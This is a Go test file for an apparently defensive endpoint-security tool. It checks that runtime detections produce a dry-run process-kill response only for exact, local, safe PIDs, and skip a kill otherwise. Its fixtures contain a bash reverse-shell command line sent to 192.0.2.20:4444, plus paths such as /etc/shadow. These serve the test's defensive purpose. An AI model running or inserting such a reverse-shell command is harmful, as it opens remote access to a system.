package runtime

import (
	"context"
	"encoding/json"
	"fmt"
	"math"
	"testing"

	"github.com/1sec-project/1sec/internal/core"
	"github.com/rs/zerolog"
)

func runtimeResponse(t *testing.T) (*Watcher, *capturingPipeline, *core.ResponseEngine) {
	t.Helper()
	cp := makeCapturingPipeline()
	cfg := core.DefaultConfig()
	cfg.Enforcement = &core.EnforcementConfig{Enabled: true, DryRun: true, Preset: core.PresetStrict}
	re := core.NewResponseEngine(zerolog.Nop(), nil, cp.pipeline, cfg)
	re.Start(context.Background())
	t.Cleanup(re.Stop)
	w := &Watcher{pipeline: cp.pipeline, procMon: NewProcessMonitor()}
	return w, cp, re
}

func reverseShellEvent() *core.SecurityEvent {
	e := core.NewSecurityEvent("trusted-endpoint", "process_exec", core.SeverityInfo, "observed execution")
	e.SourceIP = "192.0.2.20" // Client/source address is not the reporting host identity.
	e.Details["process_name"] = "bash"
	e.Details["command_line"] = "bash -i >& /dev/tcp/192.0.2.20/4444 0>&1"
	e.Details["hostname"] = "127.0.0.1"
	return e
}

func TestRuntimeDetectionReachesExactProcessResponse(t *testing.T) {
	for _, pid := range []interface{}{"4242", 4242, int64(4242), float64(4242), json.Number("4242"), json.Number("4242.0"), json.Number("4.242e3")} {
		t.Run(stringPIDLabel(pid), func(t *testing.T) {
			w, cp, re := runtimeResponse(t)
			e := reverseShellEvent()
			e.Details["pid"] = pid
			e.Details["file_path"] = "/etc/shadow"
			e.Details["unrelated_secret"] = "must-not-propagate"
			if err := w.HandleEvent(e); err != nil {
				t.Fatal(err)
			}
			records := re.GetRecords(100, ModuleName)
			kills := 0
			for _, record := range records {
				if record.Action != core.ActionKillProcess {
					continue
				}
				kills++
				if record.Target != "4242" || record.Status != core.ActionStatusDryRun {
					t.Fatalf("process detection lost exact response target: %+v", record)
				}
			}
			if kills != 1 {
				t.Fatalf("expected exact process response, got %d", kills)
			}
			if len(cp.alerts) != 1 {
				t.Fatalf("unexpected alerts: %d", len(cp.alerts))
			}
			a := cp.alerts[0]
			if a.Metadata["process_id"] != "4242" || a.Metadata["process_host"] != "127.0.0.1" || a.Metadata["original_event_id"] != e.ID {
				t.Fatalf("lost process provenance: %+v", a.Metadata)
			}
			if a.Metadata["file_path"] != nil || a.Metadata["unrelated_secret"] != nil {
				t.Fatal("promoted arbitrary details into response authority")
			}
		})
	}
}

func stringPIDLabel(v interface{}) string { return fmt.Sprintf("%T_%v", v, v) }

func TestRuntimeUnsafeTargetsStayObservable(t *testing.T) {
	cases := map[string]func(*core.SecurityEvent){
		"missing PID":         func(e *core.SecurityEvent) { delete(e.Details, "pid") },
		"fractional":          func(e *core.SecurityEvent) { e.Details["pid"] = 4242.5 },
		"exact JSON fraction": func(e *core.SecurityEvent) { e.Details["pid"] = json.Number("4242.00000000000000001") },
		"NaN":                 func(e *core.SecurityEvent) { e.Details["pid"] = math.NaN() },
		"infinite":            func(e *core.SecurityEvent) { e.Details["pid"] = math.Inf(1) },
		"negative":            func(e *core.SecurityEvent) { e.Details["pid"] = -4242 },
		"init":                func(e *core.SecurityEvent) { e.Details["pid"] = 1 },
		"overflow":            func(e *core.SecurityEvent) { e.Details["pid"] = uint64(math.MaxUint64) },
		"malformed":           func(e *core.SecurityEvent) { e.Details["process_id"] = "4242oops" },
		"conflicting aliases": func(e *core.SecurityEvent) { e.Details["process_id"] = 4243 },
		"missing host":        func(e *core.SecurityEvent) { delete(e.Details, "hostname") },
		"remote host":         func(e *core.SecurityEvent) { e.Details["hostname"] = "remote.invalid" },
		"conflicting hosts":   func(e *core.SecurityEvent) { e.Details["syslog_hostname"] = "remote.invalid" },
		"opaque host ID":      func(e *core.SecurityEvent) { e.Details["host_id"] = "unmapped-host-id" },
		"unknown namespace":   func(e *core.SecurityEvent) { e.Details["pid_namespace"] = "host" },
		"container PID":       func(e *core.SecurityEvent) { e.Details["container_id"] = "container-1" },
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			w, cp, re := runtimeResponse(t)
			e := reverseShellEvent()
			e.Details["pid"] = 4242
			mutate(e)
			w.HandleEvent(e)
			if cp.count() != 1 {
				t.Fatal("unsafe target suppressed detection")
			}
			for _, record := range re.GetRecords(100, ModuleName) {
				if (record.Action == core.ActionKillProcess || record.Action == core.ActionQuarantineFile) && record.Status != core.ActionStatusSkipped {
					t.Fatalf("unsafe target reached response: %+v", record)
				}
			}
		})
	}
}

func TestRuntimeJSONPIDEligibility(t *testing.T) {
	for _, literal := range []string{"4242", "4242.0", "4.242e3", "4242.00000000000000001", "4.24200000000000000001e3", "1e999999999"} {
		t.Run(literal, func(t *testing.T) {
			w, _, re := runtimeResponse(t)
			wire := fmt.Sprintf(`{"type":"process_exec","source_ip":"192.0.2.20","details":{"pid":%s,"syslog_hostname":"127.0.0.1","process_name":"bash","command_line":"bash -i >& /dev/tcp/192.0.2.20/4444 0>&1"}}`, literal)
			e, err := core.UnmarshalSecurityEvent([]byte(wire))
			// Oversized exponent can overflow ordinary float telemetry decoding;
			// rejection at the JSON boundary also satisfies fail-closed targeting.
			if err != nil {
				if literal != "1e999999999" {
					t.Fatal(err)
				}
				return
			}
			w.HandleEvent(e)
			eligible := literal == "4242" || literal == "4242.0" || literal == "4.242e3"
			kills := 0
			for _, record := range re.GetRecords(100, ModuleName) {
				if record.Action != core.ActionKillProcess {
					continue
				}
				kills++
				if eligible && (record.Target != "4242" || record.Status != core.ActionStatusDryRun) {
					t.Fatalf("exact PID lost through JSON: %+v", record)
				}
				if !eligible && record.Status != core.ActionStatusSkipped {
					t.Fatalf("fraction rounded into executable PID: %+v", record)
				}
			}
			if kills != 1 {
				t.Fatalf("expected one process disposition, got %d", kills)
			}
		})
	}
}

func TestRuntimeInjectionSelectsSourceNotVictim(t *testing.T) {
	for _, hasSource := range []bool{false, true} {
		w, cp, re := runtimeResponse(t)
		e := core.NewSecurityEvent("collector", "memory_injection", core.SeverityInfo, "injection observed")
		e.Details = map[string]interface{}{"target_pid": 9001, "target_process": "victim", "source_process": "injector", "hostname": "127.0.0.1"}
		if hasSource {
			e.Details["source_pid"] = 4242
		}
		w.HandleEvent(e)
		if len(cp.alerts) != 1 {
			t.Fatal("lost injection alert")
		}
		for _, r := range re.GetRecords(100, ModuleName) {
			if r.Action != core.ActionKillProcess {
				continue
			}
			if hasSource && (r.Status != core.ActionStatusDryRun || r.Target != "4242") {
				t.Fatalf("source PID lost: %+v", r)
			}
			if !hasSource && r.Status != core.ActionStatusSkipped {
				t.Fatalf("victim granted kill authority: %+v", r)
			}
		}
		if hasSource && cp.alerts[0].Metadata["process_id"] != "4242" {
			t.Fatal("source identity lost")
		}
		if !hasSource && cp.alerts[0].Metadata["process_id"] != nil {
			t.Fatal("victim became process target")
		}
	}
}

func TestRuntimeFileFindingsRetainContextWithoutDestructiveAuthority(t *testing.T) {
	w, cp, re := runtimeResponse(t)
	e := core.NewSecurityEvent("collector", "file_modified", core.SeverityInfo, "modified")
	e.Details = map[string]interface{}{"path": "/etc/shadow", "pid": 4242, "hostname": "127.0.0.1", "file_path": "/etc/shadow"}
	w.HandleEvent(e)
	w.emitFileChange(FileChange{Path: "/etc/shadow", Type: "modified"}, "polling")
	w.emitFileChange(FileChange{Path: "/dev/shm/payload.sh", Type: "created"}, "realtime")
	if cp.count() < 3 {
		t.Fatal("lost file alerts")
	}
	for _, a := range cp.alerts {
		if a.Metadata["affected_path"] == nil {
			t.Fatalf("file context lost: %+v", a)
		}
		if a.Metadata["file_path"] != nil || a.Metadata["process_id"] != nil {
			t.Fatalf("file observation became executable target: %+v", a.Metadata)
		}
	}
	for _, r := range re.GetRecords(100, ModuleName) {
		if (r.Action == core.ActionKillProcess || r.Action == core.ActionQuarantineFile) && r.Status != core.ActionStatusSkipped {
			t.Fatalf("file-only containment attempted: %+v", r)
		}
	}
}
